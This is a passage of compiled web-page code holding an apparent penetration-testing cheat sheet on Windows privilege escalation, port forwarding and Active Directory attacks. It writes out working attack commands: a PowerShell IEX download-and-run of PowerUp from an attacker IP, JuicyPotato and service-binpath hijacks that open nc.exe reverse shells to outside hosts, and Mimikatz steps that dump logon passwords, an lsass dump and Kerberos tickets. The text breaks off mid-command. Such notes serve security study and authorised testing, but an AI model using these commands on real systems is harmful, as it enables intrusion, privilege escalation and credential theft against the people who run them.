Version"')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("hostname")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" %username%\nnet "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("users")]),s._v("\n")])])]),t("h4",{attrs:{id:"powerup"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#powerup"}},[s._v("#")]),s._v(" Powerup")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[s._v("powershell "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Version 2 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("nop "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("exec bypass "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("IEX")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("New-Object")]),s._v(" Net"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("WebClient"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("DownloadString"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'http://192.168.119.194/PowerUp.ps1'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Invoke-AllChecks")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Powerup original url: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1")]),s._v("\n")])])]),t("h4",{attrs:{id:"windows-exploit-suggester"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#windows-exploit-suggester"}},[s._v("#")]),s._v(" Windows Exploit Suggester")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("windows-exploit-suggester "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--database")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2020")]),s._v("-05-20-mssb.xls "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--systeminfo")]),s._v(" systeminfo.txt\n")])])]),t("h4",{attrs:{id:"juicypotato"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#juicypotato"}},[s._v("#")]),s._v(" JuicyPotato")]),s._v(" "),t("p",[s._v("RottenPotatoNG and its variants leverages the privilege escalation chain based on BITS service having the MiTM listener on "),t("code",[s._v("127.0.0.1:6666")]),s._v(" and when you have SeImpersonate or SeAssignPrimaryToken privileges. During a Windows build review we found a setup where BITS was intentionally disabled and port "),t("code",[s._v("6666")]),s._v(" was taken. Neds to have "),t("code",[s._v("SeImpersonatePrivilege")]),s._v(" enabled:")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[s._v("c:\\Users\\Public\\Documents>whoami "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("priv\nPRIVILEGES INFORMATION\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),s._v("\nPrivilege Name                Description                               State   \n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("process")]),s._v(" level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" a "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("process")]),s._v("        Disabled\nSeAuditPrivilege              Generate security audits                  Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \nSeCreateGlobalPrivilege       Create global objects                     Enabled \nSeIncreaseWorkingSetPrivilege Increase a "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("process")]),s._v(" working "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("set")]),s._v("            Disabled\n")])])]),t("ul",[t("li",[t("a",{attrs:{href:"https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato",target:"_blank",rel:"noopener noreferrer"}},[s._v("Juicy-Potato-description"),t("OutboundLink")],1)]),s._v(" "),t("li",[t("a",{attrs:{href:"https://github.com/ohpe/juicy-potato/releases",target:"_blank",rel:"noopener noreferrer"}},[s._v("Juicy-Potato release"),t("OutboundLink")],1)])]),s._v(" "),t("h5",{attrs:{id:"usage"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#usage"}},[s._v("#")]),s._v(" Usage")]),s._v(" "),t("p",[s._v("We will need "),t("code",[s._v("CLSID")]),s._v("'s to use for the scrip. Either by running the script "),t("a",{attrs:{href:"https://ohpe.it/juicy-potato/CLSID/GetCLSID.ps1",target:"_blank",rel:"noopener noreferrer"}},[s._v("Get-CLSID.ps1"),t("OutboundLink")],1),s._v(" or by finding the corresponding one inside this "),t("a",{attrs:{href:"https://ohpe.it/juicy-potato/CLSID/",target:"_blank",rel:"noopener noreferrer"}},[s._v("list"),t("OutboundLink")],1),s._v(" and use psexec to change to a service account: "),t("a",{attrs:{href:"https://download.sysinternals.com/files/PSTools.zip",target:"_blank",rel:"noopener noreferrer"}},[s._v("pstools"),t("OutboundLink")],1)]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[s._v("JuicyPotato "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("l 1337 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("p c:\\windows\\system32\\cmd"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("exe "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("a "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/c c:\\users\\public\\desktop\\nc.exe -e cmd.exe 10.10.10.12 443"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("t "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# or ")]),s._v("\njuicypotato"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("exe "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("l 1337 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("p c:\\windows\\system32\\cmd"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("exe "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("t "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("c "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("e60687f7-01a1-40aa-86ac-db1cbf673334"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])])]),t("h4",{attrs:{id:"windows-services"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#windows-services"}},[s._v("#")]),s._v(" Windows Services")]),s._v(" "),t("h5",{attrs:{id:"sc-exe"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#sc-exe"}},[s._v("#")]),s._v(" sc.exe")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("sc query "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("state")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" all "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" findstr "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"SERVICE_NAME:"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" Servicenames.txt\n\nFOR /F %i "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Servicenames.txt"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" DO "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" %i\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("type")]),s._v(" Servicenames.txt\n\nFOR /F "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"tokens=2 delims= "')]),s._v(" %i "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Servicenames.txt"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" DO @echo %i "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" services.txt\n\nFOR /F %i "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("services.txt"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" DO @sc qc %i "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" findstr "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"BINARY_PATH_NAME"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" path.txt\n")])])]),t("p",[t("code",[s._v('cacls "C:\\path\\to\\file.exe"')])]),s._v(" "),t("p",[s._v("we want to look for "),t("code",[s._v("BUITIN/users:(F)")]),s._v(" or when our user/usergroup has "),t("code",[s._v("(F)")]),s._v(" or "),t("code",[s._v("(C)")]),s._v(" rights.")]),s._v(" "),t("p",[s._v("then we can just replace that exe with our own malicious exe and rerun the service:")]),s._v(" "),t("p",[t("code",[s._v("net stop [service name] && net start [service name].")])]),s._v(" "),t("h6",{attrs:{id:"example"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#example"}},[s._v("#")]),s._v(" Example")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("sc config upnphost "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("binpath")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:\\Inetpub'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("c.exe 192.168.119.194 443 -e c:\\Windows\\system32"),t("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[s._v("\\c")]),s._v('md.exe"')]),s._v("\nsc config upnphost "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("obj")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('".\\LocalSystem"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("password")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),s._v("\nsc config upnphost "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("depend")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),s._v("\nsc qc upnphost\nnet start upnphost\n")])])]),t("h5",{attrs:{id:"microsoft-systems-internal-suite"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#microsoft-systems-internal-suite"}},[s._v("#")]),s._v(" Microsoft systems internal suite")]),s._v(" "),t("p",[s._v("This system's internal suite: "),t("a",{attrs:{href:"https://download.sysinternals.com/files/SysinternalsSuite.zip",target:"_blank",rel:"noopener noreferrer"}},[s._v("Link"),t("OutboundLink")],1),s._v(" contains a variety of scripts that can be used to check user privileges.")]),s._v(" "),t("p",[s._v("Now we can use the following:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("C:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Inetpub"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("accesschk.exe "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-uwcqv")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Authenticated Users"')]),s._v(" *\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" accesschk.exe "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-uwcqv")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Authenticated Users"')]),s._v(" *\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" accesschk.exe "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-ucqv")]),s._v(" SSDPSRV\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" accesschk.exe "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-ucqv")]),s._v(" upnphost\n")])])]),t("p",[s._v("This guide is useful: https://www.fuzzysecurity.com/tutorials/16.html")]),s._v(" "),t("h4",{attrs:{id:"winpeas"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#winpeas"}},[s._v("#")]),s._v(" WinPEAS")]),s._v(" "),t("p",[s._v("Windows privelege escalation checker "),t("a",{attrs:{href:"https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe",target:"_blank",rel:"noopener noreferrer"}},[s._v("Link"),t("OutboundLink")],1)]),s._v(" "),t("h3",{attrs:{id:"linux"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#linux"}},[s._v("#")]),s._v(" Linux")]),s._v(" "),t("p",[s._v("Can use linux priv esc checker.")]),s._v(" "),t("h2",{attrs:{id:"port-forwarding"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#port-forwarding"}},[s._v("#")]),s._v(" Port forwarding")]),s._v(" "),t("h3",{attrs:{id:"remote-port-forwarding"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#remote-port-forwarding"}},[s._v("#")]),s._v(" Remote port forwarding")]),s._v(" "),t("p",[s._v("Traffic sent to victim port will be sent to our port instead. This can be used to bypass firewalls.")]),s._v(" "),t("p",[s._v("First, on victim machine:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-N")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-R")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("our_ip"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(":"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("our_port_number"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(":127.0.0.1:"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("port_to_forward"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("our_username"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("@"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("our_ip"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])])]),t("p",[s._v("Then on our machine to verify:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("ss "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-antp")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"<out_port_number>"')]),s._v("\n")])])]),t("h2",{attrs:{id:"active-directory"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#active-directory"}},[s._v("#")]),s._v(" Active Directory")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token namespace"}},[s._v("[System.DirecrotyServices.ActiveDirectory.Domain]")]),s._v("::GetCurrentDomain"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])])]),t("h3",{attrs:{id:"get-all-service-principal-names-spn-s"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#get-all-service-principal-names-spn-s"}},[s._v("#")]),s._v(" Get all Service Principal Names (SPN's)")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[s._v("cls\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$search")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("New-Object")]),s._v(" DirectoryServices"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("DirectorySearcher"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token namespace"}},[s._v("[ADSI]")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$search")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("filter")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"(servicePrincipalName=*)"')]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("## You can use this to filter for OU's:")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("## $results = $search.Findall() | ?{ $_.path -like '*OU=whatever,DC=whatever,DC=whatever*' }")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$results")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$search")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Findall"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("foreach")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$result")]),s._v(" in "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$results")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n\t"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$userEntry")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$result")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("GetDirectoryEntry"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\t"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Write-host")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Object Name = "')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$userEntry")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("name "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("backgroundcolor "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"yellow"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("foregroundcolor "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"black"')]),s._v("\n\t"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Write-host")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"DN      =      "')]),s._v("  "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$userEntry")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("distinguishedName\n\t"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Write-host")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Object Cat. = "')]),s._v("  "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$userEntry")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("objectCategory\n\t"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Write-host")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"servicePrincipalNames"')]),s._v("\n\n\t"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$i")]),s._v("=1\n\t"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("foreach")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$SPN")]),s._v(" in "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$userEntry")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("servicePrincipalName "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n\t\t"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Write-host")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"SPN("')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$i")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('")   =      "')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$SPN")]),s._v("\n\t\t"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$i")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+=")]),s._v("1\n\t"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\t"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Write-host")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])])]),t("h3",{attrs:{id:"mimikatz"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#mimikatz"}},[s._v("#")]),s._v(" Mimikatz")]),s._v(" "),t("h4",{attrs:{id:"password-hashes"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#password-hashes"}},[s._v("#")]),s._v(" Password Hashes")]),s._v(" "),t("p",[s._v("To get password hashes on windows, we can use "),t("a",{attrs:{href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noopener noreferrer"}},[s._v("mimikatz"),t("OutboundLink")],1)]),s._v(" "),t("p",[s._v("Then in mimikats:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("c:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Tools"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("active_directory"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("mimikatz.exe\n\n  "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#####.   mimikatz 2.1.1 (x86) built on Mar 25 2018 21:00:57")]),s._v("\n "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v('## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)')]),s._v("\n "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")]),s._v("\n "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("## \\ / ##       > http://blog.gentilkiwi.com/mimikatz")]),s._v("\n "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'## v ##'")]),s._v("       Vincent LE TOUX             "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" vincent.letoux@gmail.com "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n  "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'#####'")]),s._v("        "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# privilege::debug")]),s._v("\nPrivilege "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'20'")]),s._v(" OK\n\nmimikatz "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# sekurlsa::logonpasswords")]),s._v("\n")])])]),t("p",[s._v("or")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("sekurlsa::minidump C:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Users"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("%USERNAME%"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Documents"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("lsass.DMP\n")])])]),t("h4",{attrs:{id:"tickets-ticket-granting-ticket-ticket-granting-service"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#tickets-ticket-granting-ticket-ticket-granting-service"}},[s._v("#")]),s._v(" Tickets [Ticket Granting Ticket / Ticket Granting Service]")]),s._v(" "),t("p",[s._v("TGT can request for TGS for resources wanted in domain")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("sekurlsa::tickets\n")])])]),t("h3",{attrs:{id:"display-kerberos-service-ticket"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#display-kerberos-service-ticket"}},[s._v("#")]),s._v(" Display kerberos service ticket")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("PS")]),s._v(" C:\\Windows\\system32> "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Add-Type")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("AssemblyName System"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("IdentityModel\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("PS")]),s._v(" C:\\Windows\\system32> "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("New-Object")]),s._v(" System"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("IdentityModel"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Tokens"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("KerberosRequestorSecurityToken "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("ArgumentList "),t("span",{pre:!0,attrs:{class:"token 